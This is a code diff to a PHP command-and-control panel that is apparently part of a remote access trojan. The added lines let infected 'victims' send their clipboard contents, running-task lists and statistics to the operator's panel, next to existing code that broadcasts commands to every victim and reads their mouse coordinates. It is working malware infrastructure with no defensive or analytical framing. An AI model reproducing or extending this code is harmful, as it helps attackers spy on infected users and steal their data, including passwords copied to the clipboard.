@@ -123,6 +123,21 @@ if ($action == "getcords") {	echo cache_get($victim . "mousecords"); cache_set($
 if ($action == "@everyone") {	 $victims = array_diff(scandir('victims/'), array('.', '..'));
 foreach($victims as $list){ cache_set($list . "action" ,"$actioncontent|$actioncontent2|$actioncontent3|$actioncontent4|$actioncontent5"); 	}	}
 
+// Datas send / recieved correctly but didn't finished victim to send instruction & pannel to recieve
+if ($action == "sendtasks") {	cache_set($victim . "taskmgr" , "$actioncontent");	}
+if ($action == "gettasks") {	echo(cache_get($target . "taskmgr"));	cache_set($target . "taskmgr",""); }
+///////////////////////////////////////////////////////
+
+// Clipboard send / return by  pannel to stub
+if ($action == "sendclipboard") { cache_set($victim . "clipboard" , "$actioncontent");  }
+if ($action == "getclipboard") {  echo(cache_get($target . "clipboard")); cache_set($target . "clipboard",""); }
+///////////////////////////////////////////////////////
+
+// Stats send / return by pannel to stub
+if ($action == "sendstatistics") { cache_set($victim . "statistics" , "$actioncontent");  }
+if ($action == "getstatistics") {  echo(cache_get($target . "statistics")); cache_set($target . "statistics",""); }
+///////////////////////////////////////////////////////
+
 
 // Not working because we need to get VPS file path to send it to convertmp3 (wich use public link to convert file..........)
 // if ($action == "playmp3") {
